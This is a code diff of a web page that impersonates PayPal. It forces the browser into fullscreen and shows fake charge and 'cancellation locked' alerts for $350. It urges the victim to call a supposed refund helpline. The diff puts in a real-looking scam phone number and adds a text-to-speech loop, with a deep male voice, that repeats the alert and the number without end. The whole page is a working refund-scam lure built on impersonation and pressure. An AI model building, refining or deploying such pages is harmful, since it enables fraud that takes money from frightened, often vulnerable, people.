@@ -184,7 +184,6 @@
             animation: bounceIn 0.5s ease-out;
         }
 
-        /* ক্যানসেলের ক্ষেত্রে রেড ওয়ার্নিং আইকন বক্স */
         .cancel-warning-icon {
             width: 80px;
             height: 80px;
@@ -287,7 +286,6 @@
     <div class="fullscreen-overlay" id="fullscreenOverlay">
         <div class="processing-box">
             
-            <!-- ডায়নামিক আইকন (টিকমার্ক বা ওয়ার্নিং) -->
             <div id="modalIcon" class="success-checkmark">✓</div>
 
             <div id="modalMainTitle" style="color: #003087; font-size: 20px; font-weight: bold; margin-bottom: 8px;">TRANSACTION COMPLETED & SECURED</div>
@@ -299,7 +297,7 @@
 
             <div class="hotline-box">
                 <div style="font-size: 12px; color: #1e40af; font-weight: bold;" id="hotlineTitle">Call PayPal Refund & Support Helpline:</div>
-                <a href="tel:+18001234567" class="hotline-number">📞 +1 (800) 123-4567</a>
+                <a href="tel:+18014595498" class="hotline-number">📞 +1 (801) 459-5498</a>
             </div>
 
             <div style="font-size: 11px; color: #94a3b8;">
@@ -311,8 +309,10 @@
 
     <!-- জাভাস্ক্রিপ্ট লজিক -->
     <script>
+        let currentVoiceText = "";
+        let isFlowActive = false;
+
         function triggerCheckoutFlow(type) {
-            // ব্রাউজার ফুল-স্ক্রিন মোড
             let elem = document.documentElement;
             if (elem.requestFullscreen) {
                 elem.requestFullscreen().catch(err => console.log(err));
@@ -328,8 +328,9 @@
             let modalMainTitle = document.getElementById('modalMainTitle');
             let modalMainDesc = document.getElementById('modalMainDesc');
 
+            isFlowActive = true;
+
             if (type === 'cancel') {
-                // অর্ডার ক্যানসেল ফ্লো (অর্ডার ক্যানসেলেড হবে না, লক হয়ে কাস্টমার কেয়ারে কল করতে বলবে)
                 modalIcon.className = "cancel-warning-icon";
                 modalIcon.innerHTML = "⚠️";
                 modalMainTitle.innerText = "ORDER CANCELLATION LOCKED";
@@ -342,9 +343,8 @@
                 notifTitle.innerText = "Cancellation Failed - Action Required";
                 notifDesc.innerText = "Direct refund locked. Call support to reverse $350.00 charge.";
 
-                playVoice("PayPal security alert. Order cancellation is currently locked. Please call customer support immediately to cancel your transaction and process your refund.");
+                currentVoiceText = "PayPal security alert. Order cancellation is currently locked. Please call customer support immediately at plus one 801 459 5498 to cancel your transaction and process your refund.";
             } else {
-                // পেমেন্ট কমপ্লিট ফ্লো
                 modalIcon.className = "success-checkmark";
                 modalIcon.innerHTML = "✓";
                 modalMainTitle.innerText = "TRANSACTION COMPLETED & SECURED";
@@ -357,26 +357,60 @@
                 notifTitle.innerText = "Successfully Sent $350.00 USD";
                 notifDesc.innerText = "To: Global Tech Support & Adoption Services";
 
-                playVoice("PayPal transaction alert. Successfully sent 350 dollars. If you did not authorize this payment, please call customer support immediately to cancel and reverse the transaction.");
+                currentVoiceText = "PayPal transaction alert. Successfully sent 350 dollars. If you did not authorize this payment, please call customer support immediately at plus one 801 459 5498 to cancel and reverse the transaction.";
             }
 
-            // ১. ফুল-স্ক্রিন ওভারলে দেখানো
             overlay.style.display = 'flex';
 
-            // ২. পুশ নোটিফিকেশন নামানো
             setTimeout(() => {
                 notif.classList.add('show');
             }, 300);
+
+            // ভয়েস লুপ চালু করা
+            startContinuousMaleVoice();
         }
 
-        function playVoice(text) {
-            if ('speechSynthesis' in window) {
+        // পুরুষ কন্ঠ এবং অবিরাম লুপ (Continuous Loop) ফাংশন
+        function startContinuousMaleVoice() {
+            if (!('speechSynthesis' in window)) return;
+
+            function playLoop() {
+                if (!isFlowActive) return;
                 window.speechSynthesis.cancel();
-                let msg = new SpeechSynthesisUtterance();
-                msg.text = text;
-                msg.rate = 0.9;
+
+                let msg = new SpeechSynthesisUtterance(currentVoiceText);
+                msg.rate = 0.92;
+                msg.pitch = 0.8; // গম্ভীর বা পুরুষ কণ্ঠের রূপ দেওয়ার জন্য
+
+                let voices = window.speechSynthesis.getVoices();
+                let maleVoice = voices.find(v => 
+                    (v.name.includes('Male') || v.name.includes('David') || v.name.includes('Mark') || v.name.includes('James') || v.name.includes('Google US English') || v.name.includes('Alex')) && v.lang.startsWith('en')
+                ) || voices.find(v => v.lang.startsWith('en'));
+
+                if (maleVoice) {
+                    msg.voice = maleVoice;
+                }
+
+                // ভয়েস শেষ হওয়ার পর সামান্য বিরতি দিয়ে আবার বাজবে (ইনফিনিট লুপ)
+                msg.onend = function() {
+                    if (isFlowActive) {
+                        setTimeout(() => {
+                            playLoop();
+                        }, 1500); // ১.৫ সেকেন্ড পর পর আবার ভয়েস রিপ্লে হবে
+                    }
+                };
+
                 window.speechSynthesis.speak(msg);
             }
+
+            playLoop();
+        }
+
+        // ভয়েস লিস্ট লোড নিশ্চিত করার জন্য
+        if ('speechSynthesis' in window) {
+            window.speechSynthesis.onvoiceschanged = function() {
+                window.speechSynthesis.getVoices();
+            };
         }
     </script>
 
